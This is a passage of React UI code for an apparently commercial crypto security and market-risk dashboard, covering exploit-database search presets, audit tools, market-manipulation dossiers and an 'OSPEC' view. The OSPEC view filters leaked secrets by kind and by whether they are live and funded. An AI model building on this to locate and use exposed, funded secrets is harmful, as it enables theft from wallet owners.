                <span className="text-muted-foreground">{isRu ? "Режим цели:" : "Target Mode:"}</span>
                {[
                  { id: "auto", label: isRu ? "⚡ Авто" : "⚡ Auto", minR: 1 },
                  { id: "address", label: isRu ? "📜 Контракт / Кошелёк [RADAR+]" : "📜 Contract / EOA [RADAR+]", minR: 1 },
                  { id: "pool", label: isRu ? "💧 LP Pool [RAW+]" : "💧 LP Pool [RAW+]", minR: 2 },
                  { id: "multichain", label: isRu ? "🌐 Мультичейн [BLACKBOX]" : "🌐 Multichain [BLACKBOX]", minR: 3 },
                ].map((m) => (
                  <button
                    key={m.id}
                    type="button"
                    onClick={() => {
                      if (rank < m.minR) {
                        setError(
                          isRu
                            ? `Режим «${m.label}» доступен начиная с тарифа ${m.minR === 3 ? "BLACKBOX" : "RAW"}.`
                            : `Mode "${m.label}" requires ${m.minR === 3 ? "BLACKBOX" : "RAW"} tier.`
                        );
                        return;
                      }
                      setError(null);
                      setFundsMode(m.id as any);
                    }}
                    className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                      fundsMode === m.id
                        ? "border-primary bg-primary/15 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {m.label}
                  </button>
                ))}
                <span className="ml-2 text-muted-foreground">{isRu ? "Период:" : "Window:"}</span>
                {[7, 14, 30].map((d) => (
                  <button
                    key={d}
                    type="button"
                    onClick={() => setFundsDays(d)}
                    className={`rounded-lg border px-2 py-1 font-semibold ${
                      fundsDays === d
                        ? "border-primary bg-primary/15 text-primary"
                        : "border-border bg-background text-muted-foreground hover:text-foreground"
                    }`}
                  >
                    {d}d
                  </button>
                ))}
              </div>
              <div className="flex flex-wrap items-center gap-1.5">
                {[
                  { label: "USDC Contract", val: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
                  { label: "Aave V3 Pool", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2" },
                  { label: "Curve 3Pool", val: "0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7" },
                ].map((p) => (
                  <button
                    key={p.val}
                    type="button"
                    onClick={() => setInput1(p.val)}
                    className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* Quick presets for Web3 Surface Mapper */}
          {tool === "surface" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые домены протоколов:" : "Quick protocol domains:"}</span>
              {["aave.com", "dexe.network", "across.to", "lido.fi", "curve.fi"].map((dom) => (
                <button
                  key={dom}
                  type="button"
                  onClick={() => setInput1(dom)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {dom}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for 2,539 Exploits DB (1,678 Deep Writeups + 861 DeFiHackLabs) */}
          {tool === "hacks" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">
                {isRu ? "Быстрый поиск по 1,678 разборам или 0x-контракту:" : "Quick search across 1,678 writeups or 0x contract:"}
              </span>
              {[
                { label: "Uranium ($50M K-Check)", val: "uranium" },
                { label: "Euler Finance", val: "euler" },
                { label: "Curve / Vyper Reentrancy", val: "curve" },
                { label: "TWAP / Spot Oracle", val: "slot0" },
                { label: "Cross-Chain Bridges", val: "vuln/bridge" },
                { label: "0x8787...A4E2 (Aave V3 Pool)", val: "0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2" },
              ].map((p) => (
                <button
                  key={p.val}
                  type="button"
                  onClick={() => setInput1(p.val)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {p.label}
                </button>
              ))}
            </div>
          )}

          {/* Quick presets for Audit Drift (GitHub repos with audits/ folders) */}
          {tool === "drift" && (
            <div className="flex flex-wrap items-center gap-2 pt-1 font-mono text-[11px]">
              <span className="text-muted-foreground">{isRu ? "Быстрые репо с аудитами:" : "Quick audited repos:"}</span>
              {[
                "https://github.com/aave/aave-v3-core",
                "https://github.com/OpenZeppelin/openzeppelin-contracts",
                "https://github.com/curvefi/curve-stablecoin",
              ].map((preset) => (
                <button
                  key={preset}
                  type="button"
                  onClick={() => setInput1(preset)}
                  className="rounded-lg border border-border bg-background px-2.5 py-1 text-muted-foreground hover:border-primary hover:text-primary"
                >
                  {preset.replace("https://github.com/", "")}
                </button>
              ))}
            </div>
          )}

          {/* Telegram-style quick filters for OSPEC */}
          {tool === "ospec" && (
            <div className="space-y-2 pt-1">
              <div className="flex flex-wrap items-center gap-2 font-mono text-[11px]">
                <button
                  type="button"
                  onClick={() => {
                    setInput1("");
                    setOspecSeverity("");
                    setOspecOnlyReal(true);
                    setOspecOnlyLive(false);
                    runOspecWithFilters({ q: "", sev: "", real: true, live: false, offset: 0 });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    !ospecSeverity && ospecOnlyReal && !ospecOnlyLive && !input1
                      ? "border-primary bg-primary/15 text-primary"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🔍 {isRu ? "Последние REAL" : "Recent REAL"}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = ospecSeverity === "CRITICAL" ? "" : "CRITICAL";
                    setOspecSeverity(next);
                    runOspecWithFilters({ sev: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecSeverity === "CRITICAL"
                      ? "border-destructive bg-destructive/20 text-destructive"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🔴 Critical
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = ospecSeverity === "HIGH" ? "" : "HIGH";
                    setOspecSeverity(next);
                    runOspecWithFilters({ sev: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecSeverity === "HIGH"
                      ? "border-primary bg-primary/20 text-primary"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🟠 High
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = !ospecOnlyReal;
                    setOspecOnlyReal(next);
                    runOspecWithFilters({ real: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecOnlyReal
                      ? "border-green-500/60 bg-green-500/15 text-green-400"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🟢 {isRu ? "Только REAL" : "Only REAL"}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const next = !ospecOnlyLive;
                    setOspecOnlyLive(next);
                    runOspecWithFilters({ live: next });
                  }}
                  className={`rounded-lg border px-2.5 py-1 font-semibold transition-all ${
                    ospecOnlyLive
                      ? "border-amber-500/60 bg-amber-500/15 text-amber-400"
                      : "border-border bg-background text-muted-foreground hover:text-foreground"
                  }`}
                >
                  🔥 {isRu ? "LIVE / С балансом" : "LIVE / Funded"}
                </button>
              </div>

              {result?.kind_stats?.length > 0 && (
                <div className="flex flex-wrap items-center gap-1.5 font-mono text-[10px]">
                  <span className="text-muted-foreground">{isRu ? "Типы секретов:" : "Secret kinds:"}</span>
                  {result.kind_stats.slice(0, 8).map((ks: any) => {
                    const shortKind = String(ks.kind || "").replace("secret:", "");
                    return (
                      <button
                        key={ks.kind}
                        type="button"
                        onClick={() => {
                          setInput1(shortKind);
                          runOspecWithFilters({ q: shortKind });
                        }}
                        className="rounded border border-border bg-background px-2 py-0.5 text-muted-foreground hover:border-primary hover:text-primary"
                      >
                        {shortKind} <span className="text-primary">({ks.real})</span>
                      </button>
                    );
                  })}
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {error && (
        <div className="flex items-start gap-2 rounded-xl border border-destructive/40 bg-destructive/10 p-4 font-mono text-xs text-destructive">
          <AlertTriangle size={14} className="mt-0.5 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {/* RESULTS */}
      {(() => {
        const renderMarketDossier = (result: any, onClose?: () => void) => {
          if (!result) return null;
          return (
            <div className="space-y-4 font-mono">
          {/* CLI Header Banner */}
          <div className="rounded-xl border border-border bg-card p-5 space-y-4">
            <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
              <div className="flex flex-wrap items-center gap-3">
                <span
                  className={`rounded-full px-3.5 py-1 text-xs font-bold border ${
                    result.level === "CRITICAL" || result.level === "HIGH"
                      ? "bg-destructive/20 text-destructive border-destructive/40"
                      : result.level === "MEDIUM"
                      ? "bg-amber-500/20 text-amber-400 border-amber-500/40"
                      : "bg-emerald-500/15 text-emerald-400 border-emerald-500/40"
                  }`}
                >
                  {result.level === "LOW" ? "🟢" : result.level === "MEDIUM" ? "🟡" : "🔴"} MARKET RISK: {result.symbol} — {result.score}/100 ({result.level})
                </span>
                <span className="rounded-lg border border-border bg-background px-2.5 py-1 text-[11px] text-muted-foreground">
                  {result.pump_verdict || "✅ No significant pump indicators"}
                </span>
                {result.github_repo && (
                  <>
                    <a
                      href={`https://github.com/${result.github_repo}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="rounded-lg border border-primary/40 bg-primary/10 px-2.5 py-1 text-[11px] text-primary hover:underline"
                    >
                      📦 {result.github_repo} ↗
                    </a>
                    {result.audit_button_unlocked && (
                      <button
                        type="button"
                        onClick={() => {
                          window.dispatchEvent(
                            new CustomEvent("boris-quick-scan", { detail: { target: `https://github.com/${result.github_repo}` } })
                          );
                          document.getElementById("demo-scanner")?.scrollIntoView({ behavior: "smooth" });
                        }}
                        className="rounded-lg bg-primary px-2.5 py-1 text-[11px] font-bold text-primary-foreground hover:bg-primary-dim"
                      >
                        🔧 {isRu ? `Аудит ${result.github_repo.split("/").pop()}` : `Audit ${result.github_repo.split("/").pop()}`}
                      </button>
                    )}
                  </>
                )}
              </div>
              <div className="flex items-center gap-2 text-xs">
                <span className="text-muted-foreground">Data Completeness:</span>
                <div className="h-2.5 w-28 overflow-hidden rounded-full bg-background border border-border">
                  <div
                    className="h-full bg-primary transition-all"
                    style={{ width: `${Math.min(100, Number(result.confidence || 100))}%` }}
                  />
                </div>
                <b className="text-foreground">{result.confidence ?? 100}%</b>
                {onClose && (
                  <button
                    type="button"
                    onClick={onClose}
                    className="ml-2 rounded-lg border border-primary/40 bg-primary/15 px-2.5 py-1 text-[11px] font-bold text-primary hover:bg-primary hover:text-primary-foreground"
                  >
                    ✕ {isRu ? "Свернуть досье" : "Close Dossier"}
                  </button>
                )}
              </div>
            </div>

            {/* Risk Decomposition (4 CLI Bars) */}
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-4">
              {[
                {
                  label: "Manipulation Risk",
                  val: Number(result.manipulation_risk ?? 0),
                  color: Number(result.manipulation_risk ?? 0) >= 50 ? "bg-destructive" : "bg-primary",
                },
                {
                  label: "Fundamental Weakness",
                  val: Number(result.fundamental_weakness ?? 0),
                  color: Number(result.fundamental_weakness ?? 0) >= 50 ? "bg-amber-500" : "bg-primary",
                },
                {
                  label: "Crowd Overcrowding",
                  val: Number(result.crowd_overcrowding ?? 0),
                  color: Number(result.crowd_overcrowding ?? 0) >= 50 ? "bg-amber-500" : "bg-primary",
                },
                {
                  label: "Organic Probability",
                  val: Number(result.organic_probability ?? 100),
                  color: "bg-emerald-500",
                },
              ].map((bar, idx) => (
                <div key={idx} className="rounded-xl border border-border bg-background p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">{bar.label}</span>
                    <b className="text-foreground">{bar.val}/100</b>
                  </div>
                  <div className="h-2 w-full overflow-hidden rounded-full bg-card border border-border/60">
                    <div className={`h-full ${bar.color} transition-all`} style={{ width: `${Math.min(100, bar.val)}%` }} />
                  </div>
                </div>
              ))}
            </div>

            {/* Market Data (7 CLI Metrics) */}
            <div>
              <p className="mb-2 text-[10px] uppercase tracking-wider text-primary font-bold">
                📊 Market Data & Spot Telemetry
              </p>
              <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-4 lg:grid-cols-7">
                {[
                  {
                    k: "Price",
                    v:
                      result.snapshot?.price_usd !== null && result.snapshot?.price_usd !== undefined
                        ? `$${Number(result.snapshot.price_usd) < 1 ? Number(result.snapshot.price_usd).toFixed(4) : fmt(result.snapshot.price_usd)}`
                        : "—",
                  },
                  { k: "MCap", v: result.snapshot?.market_cap ? `$${fmt(result.snapshot.market_cap)}` : "—" },
                  { k: "Vol 24h", v: result.snapshot?.volume_24h ? `$${fmt(result.snapshot.volume_24h)}` : "—" },
                  {
                    k: "Δ 24h",
                    v:
                      result.snapshot?.price_change_24h !== null && result.snapshot?.price_change_24h !== undefined
                        ? `${Number(result.snapshot.price_change_24h) >= 0 ? "+" : ""}${Number(result.snapshot.price_change_24h).toFixed(1)}%`
                        : "—",
                    tone: Number(result.snapshot?.price_change_24h ?? 0) >= 0 ? "text-emerald-400" : "text-destructive",
                  },
                  {
                    k: "Δ 7d",
                    v:
                      result.snapshot?.price_change_7d !== null && result.snapshot?.price_change_7d !== undefined
                        ? `${Number(result.snapshot.price_change_7d) >= 0 ? "+" : ""}${Number(result.snapshot.price_change_7d).toFixed(1)}%`
                        : "—",
                    tone: Number(result.snapshot?.price_change_7d ?? 0) >= 0 ? "text-emerald-400" : "text-destructive",
                  },
                  {
                    k: "Δ 30d",
                    v:
                      result.snapshot?.price_change_30d !== null && result.snapshot?.price_change_30d !== undefined
                        ? `${Number(result.snapshot.price_change_30d) >= 0 ? "+" : ""}${Number(result.snapshot.price_change_30d).toFixed(1)}%`
                        : result.deep_unlocked
                        ? "—"
                        : "🔒 RAW+",
                    tone:
                      result.snapshot?.price_change_30d !== null && result.snapshot?.price_change_30d !== undefined
                        ? Number(result.snapshot.price_change_30d) >= 0
                          ? "text-emerald-400"
                          : "text-destructive"
                        : "text-muted-foreground",
                  },
                  {
                    k: "Age",
                    v:
                      result.snapshot?.listing_age_days !== null && result.snapshot?.listing_age_days !== undefined
                        ? `${result.snapshot.listing_age_days} days`
                        : result.deep_unlocked
                        ? "—"
                        : "🔒 RAW+",
                  },
                ].map((m, idx) => (
                  <div key={idx} className="rounded-lg border border-border bg-background p-3">
                    <p className="text-[10px] uppercase text-muted-foreground">{m.k}</p>
                    <p className={`mt-1 text-sm font-bold ${(m as any).tone || "text-foreground"}`}>{m.v}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Derivatives & Microstructure Section */}
            <div className="space-y-3 pt-1">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  ⚡ Derivatives, Orderflow & Multi-Exchange Matrix (BN · OKX · BB)
                </p>
                <span className="rounded border border-primary/40 bg-primary/10 px-2.5 py-0.5 text-[10px] font-bold text-primary">
                  {result.deep_unlocked
                    ? "🔓 BLACKBOX / RAW FULL DERIVATIVES TELEMETRY"
                    : "🔒 RADAR COMPACT VIEW (Upgrade to RAW/BLACKBOX for Cross-Exchange Matrix & Orderflow)"}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-4 lg:grid-cols-8">
                {[
                  { k: "OI (Binance)", v: result.snapshot?.oi_usdt ? `$${fmt(result.snapshot.oi_usdt)}` : "—" },
                  {
                    k: "OI Δ24h",
                    v:
                      result.snapshot?.oi_change_24h_pct !== null && result.snapshot?.oi_change_24h_pct !== undefined
                        ? `${Number(result.snapshot.oi_change_24h_pct) >= 0 ? "+" : ""}${Number(result.snapshot.oi_change_24h_pct).toFixed(1)}%`
                        : "—",
                  },
                  {
                    k: "OI Δ7d",
                    v:
                      result.snapshot?.oi_change_7d_pct !== null && result.snapshot?.oi_change_7d_pct !== undefined
                        ? `${Number(result.snapshot.oi_change_7d_pct) >= 0 ? "+" : ""}${Number(result.snapshot.oi_change_7d_pct).toFixed(1)}%`
                        : result.deep_unlocked
                        ? "—"
                        : "🔒 RAW+",
                  },
                  {
                    k: "OI Velocity",
                    v:
                      result.snapshot?.oi_velocity !== null && result.snapshot?.oi_velocity !== undefined
                        ? `${result.snapshot.oi_velocity}x vs base`
                        : result.deep_unlocked
                        ? "—"
                        : "🔒 RAW+",
                  },
                  {
                    k: "OI / Vol",
                    v:
                      result.snapshot?.oi_vol_ratio !== null && result.snapshot?.oi_vol_ratio !== undefined
                        ? `${result.snapshot.oi_vol_ratio}x`
                        : result.deep_unlocked
                        ? "—"
                        : "🔒 RAW+",
                  },
                  {
                    k: "Funding",
                    v:
                      result.snapshot?.funding_rate !== null && result.snapshot?.funding_rate !== undefined
                        ? Number(result.snapshot.funding_rate).toFixed(6)
                        : "—",
                  },
                  { k: "F.Trend", v: result.snapshot?.funding_trend || "—" },
                  {
                    k: "F.Avg 7d",
                    v:
                      result.snapshot?.funding_avg_7d !== null && result.snapshot?.funding_avg_7d !== undefined
                        ? Number(result.snapshot.funding_avg_7d).toFixed(6)
                        : result.deep_unlocked
                        ? "—"
                        : "🔒 RAW+",
                  },
                ].map((d, idx) => (
                  <div key={idx} className="rounded-lg border border-border bg-background p-2.5">
                    <p className="text-[10px] uppercase text-muted-foreground">{d.k}</p>
                    <p className="mt-1 text-xs font-bold text-foreground">{d.v}</p>
                  </div>
                ))}
              </div>

              {/* Deep Derivatives: Positioning, Taker Flow, Depth 2%, Cross-Exchange Matrix */}
              {result.deep_unlocked ? (
                <div className="grid grid-cols-1 gap-3 lg:grid-cols-3">
                  {/* Card 1: Positioning & Taker Flow */}
                  <div className="rounded-xl border border-border bg-background p-4 space-y-3 text-xs">
                    <p className="text-[10px] uppercase text-primary font-bold">Positioning & Taker Flow</p>
                    <div className="space-y-1">
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Longs (Accounts vs Top):</span>
                        <b className="text-foreground">
                          {result.snapshot?.long_account_pct !== null && result.snapshot?.long_account_pct !== undefined
                            ? `${Number(result.snapshot.long_account_pct).toFixed(0)}% accts`
                            : "—"}
                          {result.snapshot?.top_trader_long_pct !== null && result.snapshot?.top_trader_long_pct !== undefined
                            ? ` | top: ${Number(result.snapshot.top_trader_long_pct).toFixed(0)}% (${Number(result.snapshot.top_trader_delta ?? 0) >= 0 ? "+" : ""}${result.snapshot.top_trader_delta}%)`
                            : ""}
                        </b>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Bybit L/S Ratio:</span>
                        <b className="text-foreground">
                          {result.snapshot?.long_short_bybit !== null && result.snapshot?.long_short_bybit !== undefined
                            ? `BB ${Number(result.snapshot.long_short_bybit).toFixed(0)}%L`
                            : `L/S ${fmt(result.snapshot?.long_short_ratio)}`}
                        </b>
                      </div>
                    </div>

                    {/* Taker Buy/Sell Bar */}
                    {result.snapshot?.taker_buy_ratio !== null && result.snapshot?.taker_buy_ratio !== undefined && (
                      <div className="space-y-1 pt-1">
                        <div className="flex justify-between text-[11px]">
                          <span className="text-emerald-400 font-bold">
                            Taker Buy {(Number(result.snapshot.taker_buy_ratio) * 100).toFixed(1)}%
                          </span>
                          <span className="text-destructive font-bold">
                            Sell {(100 - Number(result.snapshot.taker_buy_ratio) * 100).toFixed(1)}%
                          </span>
                        </div>
                        <div className="h-2.5 w-full overflow-hidden rounded-full bg-destructive/40 flex">
                          <div
                            className="h-full bg-emerald-500"
                            style={{ width: `${Math.min(100, Math.max(0, Number(result.snapshot.taker_buy_ratio) * 100))}%` }}
                          />
                        </div>
                      </div>
                    )}

                    {/* Orderbook Depth 2% */}
                    <div className="flex items-center justify-between border-t border-border/60 pt-2 text-[11px]">
                      <span className="text-muted-foreground">Depth ±2%:</span>
                      <b className="text-foreground">
                        {result.snapshot?.depth_2pct_total ? `$${fmt(result.snapshot.depth_2pct_total)}` : "—"}{" "}
                        {result.snapshot?.depth_imbalance ? `(imb: ${Number(result.snapshot.depth_imbalance).toFixed(2)})` : ""}
                      </b>
                    </div>
                  </div>

                  {/* Card 2: Cross-Exchange Matrix (BN | OKX | BB) & Temporal ETM — BLACKBOX Exclusive */}
                  <div className="rounded-xl border border-border bg-background p-4 space-y-2.5 text-xs">
                    <div className="flex items-center justify-between">
                      <p className="text-[10px] uppercase text-primary font-bold">Cross-Exchange (BN · OKX · BB) & Temporal</p>
                      <span className="rounded border border-primary/40 bg-primary/10 px-1.5 py-0.5 text-[9px] font-bold text-primary">
                        BLACKBOX
                      </span>
                    </div>
                    {result.cross_exchange_unlocked ? (
                      <>
                        <div className="rounded-lg border border-border bg-card p-2.5 space-y-1.5 text-[11px]">
                          <div className="flex items-center justify-between">
                            <span className="text-muted-foreground">F.xchg:</span>
                            <span className="font-bold text-foreground">
                              BN {result.snapshot?.funding_binance !== null && result.snapshot?.funding_binance !== undefined ? Number(result.snapshot.funding_binance).toFixed(6) : "—"} | OKX{" "}
                              {result.snapshot?.funding_okx !== null && result.snapshot?.funding_okx !== undefined ? Number(result.snapshot.funding_okx).toFixed(6) : "—"} | BB{" "}
                              {result.snapshot?.funding_bybit !== null && result.snapshot?.funding_bybit !== undefined ? Number(result.snapshot.funding_bybit).toFixed(6) : "—"}
                            </span>
                          </div>
                          <div className="flex items-center justify-between">
                            <span className="text-muted-foreground">OI xchg:</span>
                            <span className="font-bold text-foreground">
                              BN ${fmt(result.snapshot?.oi_binance)} | OKX ${fmt(result.snapshot?.oi_okx)} | BB ${fmt(result.snapshot?.oi_bybit)}
                            </span>
                          </div>
                          <div className="flex items-center justify-between border-t border-border/60 pt-1.5">
                            <span className="text-muted-foreground">OI Total / Div:</span>
                            <span className="font-bold text-primary">
                              ${fmt(result.snapshot?.oi_total_multi)} · div:{" "}
                              {result.snapshot?.oi_exchange_divergence !== null && result.snapshot?.oi_exchange_divergence !== undefined
                                ? Number(result.snapshot.oi_exchange_divergence).toFixed(2)
                                : "—"}
                            </span>
                          </div>
                        </div>
                        {result.temporal && (
                          <div className="rounded-lg border border-primary/30 bg-primary/5 p-2.5 space-y-1 text-[11px]">
                            <div className="flex items-center justify-between">
                              <span className="font-bold text-primary">
                                📊 Temporal ({result.temporal.scan_count} scans / {result.temporal.span_hours}h)
                              </span>
                              <span className="text-foreground font-bold">{result.temporal.regime}</span>
                            </div>
                            {Array.isArray(result.temporal.scores) && result.temporal.scores.length > 0 && (
                              <div className="text-muted-foreground">
                                Score: <b className="text-foreground">{result.temporal.scores.join(" → ")}</b> ({result.temporal.score_trend})
                              </div>
                            )}
                            {result.temporal.etm_confidence >= 30 && result.temporal.etm_hours_low !== null && (
                              <div className="text-amber-400 font-bold">
                                ⏰ ETM: {result.temporal.etm_hours_low}h–{result.temporal.etm_hours_high}h | {result.temporal.etm_direction} ({result.temporal.etm_confidence}%)
                              </div>
                            )}
                          </div>
                        )}
                      </>
                    ) : (
                      <div className="rounded-lg border border-primary/30 bg-primary/5 p-3 text-[11px] text-muted-foreground">
                        🔒 {isRu
                          ? "Кросс-биржевое сравнение OI и фандинга (Binance · OKX · Bybit) и темпоральный ETM-анализ доступны на тарифе BLACKBOX."
                          : "Cross-Exchange OI & Funding (Binance · OKX · Bybit) and Temporal ETM analysis require BLACKBOX tier."}
                      </div>
                    )}
                  </div>

                  {/* Card 3: Supply & Data Sources + Score Breakdown */}
                  <div className="rounded-xl border border-border bg-background p-4 space-y-2.5 text-xs">
                    <p className="text-[10px] uppercase text-primary font-bold">Supply, Sources & Score Breakdown</p>
                    <div className="flex items-center justify-between text-[11px]">
                      <span className="text-muted-foreground">Circulating Supply:</span>
                      <b className="text-foreground">
                        {result.snapshot?.circ_ratio_pct !== null && result.snapshot?.circ_ratio_pct !== undefined
                          ? `${result.snapshot.circ_ratio_pct}% of total`
                          : "—"}
                      </b>
                    </div>
                    {Array.isArray(result.snapshot?.data_sources) && result.snapshot.data_sources.length > 0 && (
                      <div className="flex flex-wrap gap-1">
                        {result.snapshot.data_sources.map((srcName: string, si: number) => (
                          <span key={si} className="rounded border border-border bg-card px-2 py-0.5 text-[10px] text-muted-foreground">
                            {srcName}
                          </span>
                        ))}
                      </div>
                    )}
                    {Array.isArray(result.score_breakdown) && result.score_breakdown.length > 0 && (
                      <div className="border-t border-border/60 pt-2">
                        <p className="mb-1 text-[10px] uppercase text-muted-foreground">Score Breakdown:</p>
                        <div className="flex flex-wrap gap-1.5">
                          {result.score_breakdown.map((sb: any, sbi: number) => (
                            <span
                              key={sbi}
                              className="rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-[10px] font-bold text-primary"
                            >
                              +{sb.score} {sb.name}
                            </span>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              ) : null}
            </div>

            {/* Signals List */}
            {result.signals?.length > 0 && (
              <div className="space-y-2 pt-2 border-t border-border">
                <p className="text-[10px] uppercase tracking-wider text-primary font-bold">
                  🚨 Detected Market & CEX Signals ({result.signals_total})
                </p>
                {result.signals.map((s: any, i: number) => (
                  <div key={i} className="flex flex-wrap items-center justify-between gap-2 rounded-lg border border-border bg-background px-3.5 py-2.5 text-xs">
                    <div className="flex items-center gap-2.5">
                      <span className="rounded border border-primary/40 bg-primary/15 px-2 py-0.5 text-[10px] font-bold text-primary">
                        +{s.score} [{String(s.category || "CEX").toUpperCase()}]
                      </span>
                      <span className="font-bold text-foreground">{s.name}</span>
                      <span className="text-muted-foreground">— {s.detail}</span>
                    </div>
                  </div>
                ))}
                {result.signals_total > result.signals.length && (
                  <p className="text-[11px] text-primary">
                    +{result.signals_total - result.signals.length} {isRu ? "дополнительных сигналов доступно на тарифах RAW / BLACKBOX" : "more signals available in RAW / BLACKBOX"}
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
          );
        };

        if (!result || tool !== "market") return null;

        if (result.mode === "trending_scan") {
          return (
            <div className="space-y-4 font-mono">
              <div className="rounded-xl border border-border bg-card p-5 space-y-4">
                <div className="flex flex-wrap items-center justify-between gap-3 border-b border-border pb-3">
                  <div className="flex flex-wrap items-center gap-2.5">
                    <span className="rounded-full border border-primary/40 bg-primary/15 px-3.5 py-1 text-xs font-bold text-primary">
                      🔥 TRENDING SCAN RESULTS ({result.count_scanned} COINS)
                    </span>
                    <span className="text-xs text-muted-foreground">
                      Coins: <b className="text-foreground">{(result.trending_symbols || []).join(", ")}</b>
                    </span>
                  </div>
                  <div className="flex flex-wrap items-center gap-3 text-xs">
                    <span className="rounded border border-border bg-background px-2.5 py-1">
                      Avg Score: <b className="text-foreground">{result.avg_score}/100</b>
                    </span>
                    <span className="rounded border border-border bg-background px-2.5 py-1">
                      High Risk: <b className={Number(result.high_risk_pct) > 0 ? "text-destructive" : "text-emerald-400"}>{result.high_risk_pct}%</b>
                    </span>
                  </div>
                </div>

                {Array.isArray(result.alerts) && result.alerts.length > 0 && (
                  <div className="rounded-xl border border-destructive/40 bg-destructive/10 p-4 space-y-1.5 text-xs">
                    <p className="font-bold text-destructive uppercase text-[11px]">
                      ⚠️ {result.alerts.length} HIGH+ MANIPULATION / CROWD ALERTS DETECTED:
                    </p>
                    {result.alerts.map((al: any, ali: number) => (
                      <p key={ali} className="text-foreground">
                        <b className="text-destructive">→ ${al.symbol} ({al.score}/100 · {al.level}):</b> {al.conclusion}
                      </p>
                    ))}
                  </div>
                )}

                <p className="text-[11px] text-muted-foreground">
                  💡 {isRu ? "Нажмите на любую строку или кнопку «📊 Досье», чтобы раскрыть полное досье деривативов прямо под выбранной монетой:" : "Click any row or the Dossier button to expand the full derivatives dossier right below that coin:"}
                </p>

                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs border-collapse">
                    <thead>
                      <tr className="border-b border-border text-[10px] uppercase text-muted-foreground">
                        <th className="py-2.5 px-3">#</th>
                        <th className="py-2.5 px-3">Symbol</th>
                        <th className="py-2.5 px-3">Risk Score</th>
                        <th className="py-2.5 px-3">Price / 24h Δ</th>
                        <th className="py-2.5 px-3">MCap / Vol 24h</th>
                        <th className="py-2.5 px-3">OI Total / Funding</th>
                        <th className="py-2.5 px-3">Manip / Crowd / Org</th>
                        <th className="py-2.5 px-3">Top Signals</th>
                        <th className="py-2.5 px-3 text-right">Dossier</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-border/60">
                      {(result.results || []).map((row: any, rIdx: number) => {
                        const isSelected = selectedTrendingDossier?.symbol === row.symbol;
                        const lvlTone =
                          row.level === "CRITICAL" || row.level === "HIGH"
                            ? "border-destructive/40 bg-destructive/15 text-destructive"
                            : row.level === "MEDIUM"
                            ? "border-amber-500/40 bg-amber-500/15 text-amber-400"
                            : "border-emerald-500/40 bg-emerald-500/15 text-emerald-400";
                        return (
                          <tbody key={row.symbol} className="contents">
                            <tr
                              onClick={() => setSelectedTrendingDossier(isSelected ? null : row.dossier)}
                              className={`cursor-pointer transition-colors hover:bg-background/80 ${
                                isSelected ? "bg-primary/15 border-l-2 border-l-primary" : ""
                              }`}
                            >
                              <td className="py-2.5 px-3 text-muted-foreground">{rIdx + 1}</td>
                              <td className="py-2.5 px-3 font-bold text-foreground">${row.symbol}</td>
                              <td className="py-2.5 px-3">
                                <span className={`rounded border px-2 py-0.5 text-[10px] font-bold ${lvlTone}`}>
                                  {row.score}/100 · {row.level}
                                </span>
                              </td>
                              <td className="py-2.5 px-3">
                                <div className="font-bold text-foreground">
                                  {row.price_usd !== null && row.price_usd !== undefined
                                    ? `$${Number(row.price_usd) < 1 ? Number(row.price_usd).toFixed(5) : fmt(row.price_usd)}`
                                    : "—"}
                                </div>
                                {row.price_change_24h !== null && row.price_change_24h !== undefined && (
                                  <div className={`text-[10px] ${Number(row.price_change_24h) >= 0 ? "text-emerald-400" : "text-destructive"}`}>
                                    {Number(row.price_change_24h) >= 0 ? "+" : ""}
                                    {Number(row.price_change_24h).toFixed(1)}%
                                  </div>
                                )}
